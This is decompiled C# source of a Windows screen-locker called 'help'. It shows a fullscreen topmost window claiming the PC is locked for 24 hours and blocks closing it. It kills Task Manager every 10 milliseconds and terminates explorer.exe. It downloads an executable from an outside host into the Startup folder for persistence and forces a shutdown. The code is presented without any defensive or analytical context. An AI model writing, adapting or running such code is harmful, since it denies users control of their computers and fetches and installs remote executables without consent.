using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using help.My;

namespace help;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	private const int HWND_TOPMOST = -1;

	private const int SWP_NOMOVE = 2;

	private const int SWP_NOSIZE = 1;

	private const int HWND_NOTOPMOST = -2;

	private const int SWP_SHOWWINDOW = 64;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Label4_Click;
			if (_Label4 != null)
			{
				((Control)_Label4).remove_Click(eventHandler);
			}
			_Label4 = value;
			if (_Label4 != null)
			{
				((Control)_Label4).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Expected O, but got Unknown
		//IL_01b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Expected O, but got Unknown
		//IL_0339: Unknown result type (might be due to invalid IL or missing references)
		//IL_0343: Expected O, but got Unknown
		//IL_0356: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		Timer1 = new Timer(components);
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(10);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 72f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		Label label = Label1;
		Point location = new Point(103, 44);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(1076, 108);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Don't try to hack server!");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 72f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		Label label3 = Label2;
		location = new Point(114, 210);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(1065, 108);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("PC locked for 24 hours!");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 72f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		Label label5 = Label3;
		location = new Point(103, 387);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(337, 108);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(2);
		Label3.set_Text("Label3");
		((Control)Label4).set_BackColor(Color.Transparent);
		Label label7 = Label4;
		location = new Point(539, 260);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(17, 23);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(3);
		Label4.set_Text("Label4");
		SizeF autoScaleDimensions = new SizeF(10f, 18f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		size = new Size(1276, 925);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(5, 4, 5, 4);
		((Form)this).set_Margin(margin);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SetWindowPos(long hWnd, long hWndInsertAfter, long x, long y, long cx, long cy, long wFlags);

	private void setwinPos(Form frmform, bool bolSetToForeground)
	{
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		((Control)this).set_Name("taskmgr.exe");
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		setwinPos((Form)(object)this, bolSetToForeground: true);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\helpcounter.txt"))
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://thehacker5.npage.de/get_file.php?id=24090314&vnr=391676", Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\helpcounter.txt");
		}
		string text2;
		while (true)
		{
			string text = Conversions.ToString(DateTime.Now);
			text = Conversions.ToString(DateAndTime.DateAdd("h", 24.0, (object)text));
			text2 = Conversions.ToString(DateTime.Now);
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt"))
			{
				break;
			}
			using (File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt"))
			{
			}
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt");
			streamWriter.WriteLine(text);
			streamWriter.Close();
			streamWriter.Dispose();
		}
		StreamReader streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt");
		string text3 = streamReader.ReadLine();
		streamReader.Close();
		streamReader.Dispose();
		if (Operators.CompareString(text2, text3, false) > 0)
		{
			((Control)this).Hide();
			Timer1.set_Enabled(false);
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe"))
			{
				FileSystem.Kill(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe");
				Interaction.MsgBox((object)"Press CTRL+ALT+DEL (STRG+ALT+ENTF) and logoff (abmelden). \r\nThen you can use your PC normal", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				NewLateBinding.LateCall(objectValue, (Type)null, "Popup", new object[4]
				{
					"The 24 hours are over. Dont try to hack server!\r\nNow delete 'help.exe' from your startup folder!\r\n\r\nDie 24 Stunden sind vorbei! VERUSCHE NICHT SERVER ZU ZERSTÖREN!\r\nDu kannst nun die help.exe im Autostart (oder startup) Ordner entfernen!",
					99999,
					"Info",
					Missing.Value
				}, (string[])null, (Type[])null, (bool[])null, true);
				objectValue = null;
			}
			ProjectData.EndApp();
		}
		else
		{
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe"))
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://thehacker5.npage.de/get_file.php?id=24107976&vnr=611342", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\helpbat.exe");
			}
			Interaction.Shell("taskkill /f /im explorer.exe", (AppWinStyle)2, false, -1);
			streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\help.txt");
			text3 = streamReader.ReadLine();
			streamReader.Close();
			streamReader.Dispose();
			Label3.set_Text("To: " + text3.ToString());
			Interaction.Shell("shutdown.exe -s -f -t 10", (AppWinStyle)2, false, -1);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Label4_Click(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}
}
